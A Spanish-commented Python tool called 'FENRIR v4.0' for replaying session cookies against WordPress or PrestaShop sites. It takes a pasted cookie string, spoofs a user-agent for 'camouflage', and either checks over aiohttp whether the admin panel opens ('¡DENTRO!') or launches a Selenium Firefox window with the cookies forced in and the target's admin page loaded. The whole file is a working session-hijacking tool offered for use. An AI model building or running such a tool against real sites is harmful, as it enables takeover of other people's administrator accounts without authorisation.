import asyncio
import aiohttp
import sys
import re
import time
import logging
import os
import shutil
from dataclasses import dataclass
from typing import Optional, Dict
from enum import Enum, auto
from yarl import URL

# ==============================================================================
#  🛠️ DEPENDENCIAS EXTERNAS (SOFT LOADER)
# ==============================================================================
SELENIUM_AVAILABLE = False
try:
    from selenium import webdriver
    from selenium.webdriver.firefox.options import Options as FirefoxOptions
    from selenium.webdriver.firefox.service import Service as FirefoxService
    from webdriver_manager.firefox import GeckoDriverManager
    SELENIUM_AVAILABLE = True
except ImportError:
    pass

# ==============================================================================
#  🛠️ CONFIGURACIÓN & UTILS
# ==============================================================================

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s", datefmt="%H:%M:%S")

class Colors:
    RED, GREEN, YELLOW, CYAN, MAGENTA, RESET, BOLD = "\033[91m", "\033[92m", "\033[93m", "\033[96m", "\033[95m", "\033[0m", "\033[1m"

def colorize(text: str, color: str) -> str: return f"{color}{text}{Colors.RESET}"

class TargetType(Enum):
    WORDPRESS = auto()
    PRESTASHOP = auto()

@dataclass
class TargetConfig:
    base_url: str
    type: TargetType
    user_agent: str
    timeout: int = 20

# ==============================================================================
#  👻 GHOST BROWSER (DOMAIN FIX)
# ==============================================================================

class GhostBrowser:
    def __init__(self, config: TargetConfig):
        self.config = config

    def launch(self, raw_cookie: str, target_path: str):
        if not SELENIUM_AVAILABLE:
            print(colorize("❌ Error: Selenium no está instalado.", Colors.RED))
            return

        print(colorize("\n   👻 Invocando navegador fantasma...", Colors.CYAN))
        
        # --- FIX UBUNTU/SNAP ---
        local_tmp = os.path.join(os.getcwd(), "selenium_temp")
        if not os.path.exists(local_tmp): os.makedirs(local_tmp)
        os.environ["TMPDIR"] = local_tmp
        
        # --- PARSEO DE COOKIES ---
        cookies_dict = {}
        try:
            raw_cookie = raw_cookie.strip().replace("Cookie: ", "")
            parts = raw_cookie.split(";")
            for part in parts:
                if "=" in part:
                    key, value = part.strip().split("=", 1)
                    cookies_dict[key] = value
        except Exception as e:
            print(colorize(f"❌ Error cookies: {e}", Colors.RED))
            return

        driver = None
        try:
            options = FirefoxOptions()
            options.set_preference("general.useragent.override", self.config.user_agent)
            
            print(colorize("   📥 Preparando driver...", Colors.YELLOW))
            service = FirefoxService(GeckoDriverManager().install())
            driver = webdriver.Firefox(service=service, options=options)
            
        except Exception as e:
            print(colorize(f"   ❌ Error navegador: {e}", Colors.RED))
            return

        try:
            # 1. Extraer el dominio limpio (sin http:// ni www.)
            url_obj = URL(self.config.base_url)
            domain = url_obj.host
            if domain.startswith("www."): domain = domain[4:] # Limpieza extra
            
            print(f"   🌍 Navegando a: {colorize(domain, Colors.BOLD)} para inyectar...")
            driver.get(self.config.base_url)
            
            # 2. Inyectar Cookies CON DOMINIO EXPLÍCITO
            print(colorize("   💉 Inyectando sesión (Forzando Dominio)...", Colors.YELLOW))
            
            for name, value in cookies_dict.items():
                cookie_payload = {
                    'name': name,
                    'value': value,
                    'path': '/',
                    'domain': domain, # <--- ESTA ES LA CLAVE QUE FALTABA
                    'secure': True
                }
                try:
                    driver.add_cookie(cookie_payload)
                except Exception as cookie_error:
                    # Si falla con dominio, intentamos sin él (fallback)
                    del cookie_payload['domain']
                    driver.add_cookie(cookie_payload)

            # 3. Recargar para aplicar
            print("   🔄 Refrescando sesión...")
            driver.refresh()
            time.sleep(1) 
            
            # 4. Ir al objetivo
            final_url = f"{self.config.base_url.rstrip('/')}/{target_path.lstrip('/')}"
            print(f"   🚀 Redirigiendo a: {final_url}")
            driver.get(final_url)
            
            print(colorize("\n   ✅ HECHO. Revisa el navegador.", Colors.GREEN))
            input("   [Presiona Enter para cerrar] ")
            
        except Exception as e:
            print(colorize(f"   ❌ Error sesión: {e}", Colors.RED))
        finally:
            if driver: driver.quit()
            if os.path.exists(local_tmp):
                try: shutil.rmtree(local_tmp)
                except: pass

# ==============================================================================
#  🦍 FENRIR ENGINE (AIOHTTP)
# ==============================================================================

class FenrirEngine:
    def __init__(self, config: TargetConfig):
        self.config = config
        self.session: Optional[aiohttp.ClientSession] = None

    async def __aenter__(self):
        jar = aiohttp.CookieJar(unsafe=True)
        self.session = aiohttp.ClientSession(
            base_url=self.config.base_url,
            connector=aiohttp.TCPConnector(ssl=False),
            cookie_jar=jar,
            headers={"User-Agent": self.config.user_agent},
            timeout=aiohttp.ClientTimeout(total=self.config.timeout)
        )
        return self

    async def __aexit__(self, *args):
        if self.session: await self.session.close()

    def inject_raw_cookie(self, raw_cookie: str):
        if not self.session: return
        print(colorize("\n💉 Inyectando Cookies a la fuerza...", Colors.YELLOW))
        try:
            url_obj = URL(self.config.base_url)
            raw_cookie = raw_cookie.strip().replace("Cookie: ", "")
            parts = raw_cookie.split(";")
            loaded_cookies = []
            for part in parts:
                if "=" in part:
                    key, value = part.strip().split("=", 1)
                    self.session.cookie_jar.update_cookies({key: value}, response_url=url_obj)
                    loaded_cookies.append(key)
            if loaded_cookies:
                print(colorize(f"✅ Cookies cargadas: {loaded_cookies}", Colors.GREEN))
            else:
                print(colorize("❌ ERROR: Formato incorrecto.", Colors.RED))
        except Exception as e: print(colorize(f"❌ Error: {e}", Colors.RED))

    async def check_target(self, path: str):
        if not self.session: return
        try:
            print(f"\n⏳ Verificando: {colorize(path, Colors.BOLD)} ...")
            async with self.session.get(path, allow_redirects=True) as resp:
                content = await resp.text()
                real_url = str(resp.url)
                
                is_success = False
                if self.config.type == TargetType.WORDPRESS:
                    # Lógica mejorada de detección
                    if "wp-login.php" not in real_url and ("wp-admin" in real_url or "wp-admin-bar" in content or "logged-in" in content):
                        is_success = True
                
                if is_success:
                     print(f"   {colorize('🔥 ¡DENTRO! ACCESO CONFIRMADO 🔥', Colors.GREEN)}")
                else:
                     print(colorize("⚠️  Sin acceso claro o rebote al login.", Colors.YELLOW))

        except Exception as e: print(f"❌ Error conexión: {e}")

# ==============================================================================
#  🎮 MAIN
# ==============================================================================

async def main():
    print(colorize("\n🦍 FENRIR v4.0 - PRECISION COOKIE 🦍\n", Colors.RED))

    # 1. URL
    url_input = input(">> URL Base: ").strip()
    if not url_input.startswith("http"): url_input = f"http://{url_input}"
    if not url_input.endswith("/"): url_input += "/"
    
    # 2. CMS
    print("\n[1] WordPress\n[2] PrestaShop")
    choice = input(">> Opción: ").strip()
    target_type = TargetType.WORDPRESS if choice == '1' else TargetType.PRESTASHOP

    # 3. COOKIE
    print(f"\n{Colors.YELLOW}👉 COOKIE{Colors.RESET}")
    final_cookie_string = input("   >> Pega la cookie completa: ").strip()

    # 4. UA
    print(f"\n{Colors.CYAN}🎭 CAMUFLAJE{Colors.RESET}")
    print("   [Enter] para Firefox Linux (Recomendado poner tu UA real si falla).")
    ua_input = input(">> User-Agent: ").strip()
    if not ua_input: ua_input = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"

    # 5. RUTA
    print(f"\n{Colors.GREEN}🎯 OBJETIVO{Colors.RESET}")
    default_path = "/wp-admin/"
    path_input = input(f"   >> Ruta (Enter para {default_path}): ").strip()
    if not path_input: path_input = default_path
    if path_input.startswith("http"): path_input = URL(path_input).path
    if not path_input.startswith("/"): path_input = f"/{path_input}"

    # 6. MODO
    print(f"\n{Colors.MAGENTA}⚔️  MODO{Colors.RESET}")
    print("   [1] Check Rápido (Tu código original)")
    print("   [2] Abrir Navegador (Selenium con Fix)")
    mode = input("   >> ").strip()

    config = TargetConfig(base_url=url_input, type=target_type, user_agent=ua_input)

    if mode == '2':
        GhostBrowser(config).launch(final_cookie_string, path_input)
    else:
        async with FenrirEngine(config) as engine:
            engine.inject_raw_cookie(final_cookie_string)
            await engine.check_target(path_input)

if __name__ == "__main__":
    if sys.platform == 'win32': asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    try: asyncio.run(main())
    except KeyboardInterrupt: pass